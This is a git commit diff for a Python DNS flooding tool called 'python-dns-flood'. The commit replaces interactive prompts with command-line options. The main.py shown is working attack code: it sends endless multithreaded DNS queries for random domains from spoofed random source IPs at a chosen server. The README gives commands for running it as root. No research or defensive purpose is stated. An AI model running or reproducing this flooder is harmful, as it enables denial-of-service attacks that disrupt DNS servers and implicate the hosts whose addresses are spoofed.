455407d1fc4d968ddc8102fee4c78ffe91cb2c3a
K1llf0rce <fteppan@protonmail.com>
2022-02-21 00:53:48 +0100

    yeet find_ns and add argparse

--- README.md
+++ README.md
@@ -1,2 +1,13 @@
 # python-dns-flood
-Simple python script for flooding a DNS Server with random domain requests
+Simple DNS-Flooder
+## Preperation/Installation
+```
+git clone https://github.com/K1llf0rce/python-dns-flood.git
+cd python-dns-flood
+chmod +x main.py
+```
+## Usage:
+```
+# Run as root!
+sudo ./main.py [-h] -s SERVER -t THREADS
+```
--- main.py
+++ main.py
@@ -1,82 +1,54 @@
+#!./env/bin/python3
+
 from scapy.all import *
-import find_ns as fns
 from time import sleep
 import random
 import string
 import threading
+import argparse
 
-threads = 4
-answ = False
+# init option parser
+parser = argparse.ArgumentParser(description='Simple DNS-Flooder')
+parser.add_argument("-s", "--server", help='DNS-Server IP Address', required=True)
+parser.add_argument("-t", "--threads", type=int, help='Threads to use', required=True)
+args = parser.parse_args()
 
+# perform dns query
 def perform_query(dns, domain, sourceIP):
     packet = IP(src=sourceIP, dst=dns) / UDP() / DNS(rd=1, qd=DNSQR(qname=domain))
     send(packet)
 
+# randomized Domain
 def getRandDomain():
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(6))
 
+# randomized IP
 def getRandomIP():
     genIP = f"{random.randint(1,250)}.{random.randint(1,250)}.{random.randint(1,250)}.{random.randint(1,250)}"
     return genIP
 
+# flood
 def flood(): 
     while True:
         global answ
         domainToUse = getRandDomain()
         ipToUse = getRandomIP()
         try:
-            answ = perform_query(userDNS, f"{domainToUse}.com", ipToUse)
+            answ = perform_query(args.server, f"{domainToUse}.com", ipToUse)
         except:
             domainToUse = getRandDomain()
 
+# start threads
 def startThreads():
+    threads = int(args.threads)
     for i in range(1,threads):
         t = threading.Thread(target=flood)
         t.start()
 
-print("DNS-Flooder v0.0.3")
-sleep(1)
-print("RUN THIS SCRIPT AS ROOT OR IT WILL NOT WORK!")
-sleep(1)
-
-userSearchDNS = input(f"Want to search for the DNS Server? (y|N): ")
-
-if userSearchDNS == "y":
-    userSuppliedRange = input(f'Specify IP Range (f.E. "10.0.0.0"): ')
-    userSuppliedStart = input(f'Start at: ')
-    userSuppliedEnd = input(f'End at (f.E. "1" for "10.0.0.1"): ')
-    answ = fns.getByIPRange(userSuppliedRange, int(userSuppliedStart), int(userSuppliedEnd))
-    if answ is not False:
-        sleep(1)
-        print(f"Automatically using {answ} as target!")
-        sleep(1)
-    else:
-        print("No DNS-Server was found at specified IP-range!")
-        sleep(1)
-        print("Returning to manual setup!")
-        sleep(1)
-else:
-    print("Searching declined!")
-    sleep(1)
-
-if answ is False:
-    userDNS = input("Specify DNS Server to use: ")
-else:
-    userDNS = answ
-
-userThreads = input(f"Specify Threads to use (def {threads}): ")
-
-if userThreads == '':
-    print(f"Using Default Threads count of {threads}")
-    sleep(0.5)
-else:
-    print(f"Using Threads count of {userThreads}")
-    threads = int(userThreads)
-    sleep(0.5)
-
-print(f"Starting Flood of {userDNS} in 3 seconds ...")
+# start here
+print("RUN AS ROOT!")
+sleep(2)
+print(f"Starting Flood of {args.server} with {args.threads} Threads in 3 seconds ...")
 sleep(3)
-print(f"Flooding...")
-
 startThreads()
